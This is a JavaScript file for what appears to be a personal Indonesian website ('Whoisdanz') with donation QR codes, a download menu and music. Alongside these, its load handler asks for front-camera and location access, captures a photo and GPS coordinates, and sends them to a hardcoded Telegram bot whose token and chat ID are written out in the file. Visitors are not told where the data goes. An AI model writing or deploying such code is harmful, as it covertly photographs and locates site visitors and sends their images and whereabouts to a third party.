// ========== TELEGRAM KONFIGURASI (ISI DENGAN MILIK ANDA) ==========
const TELEGRAM_BOT_TOKEN = "8481518873:AAG8HJYnOBDmfvYx_do2uZJ0VY0H1wTeQqg";   // Ganti dengan token bot Telegram
const TELEGRAM_CHAT_ID = "8481518873";       // Ganti dengan chat ID Anda

// ========== ELEMEN LOADING ==========
const loadingScreen = document.getElementById("loading-screen");
const loadingProgress = document.getElementById("loading-progress");

// ========== FUNGSI NOTIFIKASI TOAST ==========
function showToast(message, isError = false) {
    const existingToast = document.querySelector(".toast");
    if (existingToast) existingToast.remove();

    const toast = document.createElement("div");
    toast.className = "toast";
    toast.textContent = message;
    if (isError) toast.style.borderLeftColor = "red";
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 4000);
}

// ========== KIRIM PESAN TEKS KE TELEGRAM ==========
async function sendTelegramMessage(text) {
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN") {
        console.warn("Telegram token belum diisi");
        return false;
    }
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        const res = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
        });
        return res.ok;
    } catch (e) {
        console.error("Gagal kirim pesan:", e);
        return false;
    }
}

// ========== KIRIM FOTO KE TELEGRAM (BASE64) ==========
async function sendTelegramPhoto(base64Data) {
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN") return false;
    const blob = await (await fetch(base64Data)).blob();
    const formData = new FormData();
    formData.append("chat_id", TELEGRAM_CHAT_ID);
    formData.append("photo", blob, "camera.jpg");
    try {
        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
        });
        return res.ok;
    } catch (e) {
        console.error("Gagal kirim foto:", e);
        return false;
    }
}

// ========== AMBIL 1 FRAME DARI STREAM KAMERA ==========
async function captureFrontCameraFrame(stream) {
    return new Promise((resolve) => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.setAttribute("playsinline", true);
        video.play();
        video.onloadedmetadata = () => {
            setTimeout(() => {
                const canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext("2d");
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const dataURL = canvas.toDataURL("image/jpeg", 0.8);
                // Hentikan stream setelah capture
                stream.getTracks().forEach(track => track.stop());
                resolve(dataURL);
            }, 500);
        };
    });
}

// ========== MINTA IZIN KAMERA DEPAN, LOKASI, LALU KIRIM KE TELEGRAM ==========
async function requestAndSendToTelegram() {
    let cameraGranted = false;
    let locationGranted = false;
    let photoBase64 = null;
    let coords = null;

    // ---- Kamera depan ----
    showToast("📷 Meminta izin kamera depan...");
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }
        });
        cameraGranted = true;
        showToast("✅ Izin kamera diberikan, mengambil foto...");
        photoBase64 = await captureFrontCameraFrame(stream);
        showToast("📸 Foto berhasil diambil");
    } catch (err) {
        cameraGranted = false;
        let reason = err.message;
        if (err.name === "NotAllowedError") reason = "Izin ditolak pengguna";
        else if (err.name === "NotFoundError") reason = "Tidak ada kamera depan";
        showToast(`❌ Izin kamera gagal: ${reason}`, true);
    }

    // ---- Lokasi ----
    showToast("📍 Meminta izin lokasi...");
    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
        });
        locationGranted = true;
        coords = {
            lat: position.coords.latitude,
            lon: position.coords.longitude,
            acc: position.coords.accuracy
        };
        showToast(`✅ Lokasi diizinkan: ${coords.lat}, ${coords.lon}`);
    } catch (err) {
        locationGranted = false;
        let reason = err.message;
        if (err.code === 1) reason = "Izin lokasi ditolak";
        showToast(`❌ Izin lokasi gagal: ${reason}`, true);
    }

    // ---- Kirim ke Telegram ----
    let textMsg = `📱 **Laporan dari Whoisdanz Website**\n\n`;
    textMsg += `📷 Kamera: ${cameraGranted ? "✅ Diizinkan" : "❌ Ditolak/tidak ada"}\n`;
    textMsg += `📍 Lokasi: ${locationGranted ? "✅ Diizinkan" : "❌ Ditolak"}\n`;
    if (locationGranted && coords) {
        textMsg += `🌍 Koordinat: ${coords.lat}, ${coords.lon}\n`;
        textMsg += `📏 Akurasi: ~${Math.round(coords.acc)} meter\n`;
    }
    textMsg += `⏰ Waktu: ${new Date().toLocaleString()}`;

    await sendTelegramMessage(textMsg);

    if (cameraGranted && photoBase64) {
        showToast("📤 Mengirim foto ke Telegram...");
        const sent = await sendTelegramPhoto(photoBase64);
        if (sent) showToast("📸 Foto terkirim ke Telegram");
        else showToast("⚠️ Gagal kirim foto", true);
    } else {
        await sendTelegramMessage("📷 (Tidak ada foto karena kamera tidak diizinkan)");
    }
}

// ========== QR MODAL LOGIC ==========
const qrBtn = document.getElementById("qrBtn");
const qrModal = document.getElementById("qrModal");
const closeQRBtn = document.getElementById("closeQR");

qrBtn.onclick = () => qrModal.style.display = "flex";
closeQRBtn.onclick = () => qrModal.style.display = "none";
window.onclick = (e) => {
    if (e.target === qrModal) qrModal.style.display = "none";
};

// QR SLIDER
const qrImages = [
    "QR-Donasi-Whoisdanz.png",
    "QR-Donasi2-Whoisdanz.png"
];
let currentQR = 0;
const qrImage = document.getElementById("qrImage");
document.getElementById("prevQR").onclick = () => {
    currentQR = (currentQR - 1 + qrImages.length) % qrImages.length;
    qrImage.src = qrImages[currentQR];
};
document.getElementById("nextQR").onclick = () => {
    currentQR = (currentQR + 1) % qrImages.length;
    qrImage.src = qrImages[currentQR];
};

// DOWNLOAD MENU
const downloadToggle = document.getElementById("downloadToggle");
const downloadMenu = document.getElementById("downloadMenu");
downloadToggle.onclick = () => {
    downloadMenu.style.display = downloadMenu.style.display === "flex" ? "none" : "flex";
};

// MUSIC
const music = document.getElementById("bg-music");
music.src = "soundtrack.mp3";
music.volume = 0.25;
document.addEventListener("click", () => {
    music.play().catch(() => {});
}, { once: true });

// ========== LOADING SCREEN + PROSES IZIN & TELEGRAM ==========
window.onload = () => {
    // Mulai proses izin & kirim Telegram (tidak memblokir loading bar)
    requestAndSendToTelegram();

    // Loading bar animation
    let w = 0;
    const int = setInterval(() => {
        w++;
        loadingProgress.style.width = w + "%";
        if (w >= 100) {
            clearInterval(int);
            setTimeout(() => {
                loadingScreen.style.display = "none";
            }, 500);
        }
    }, 30);
};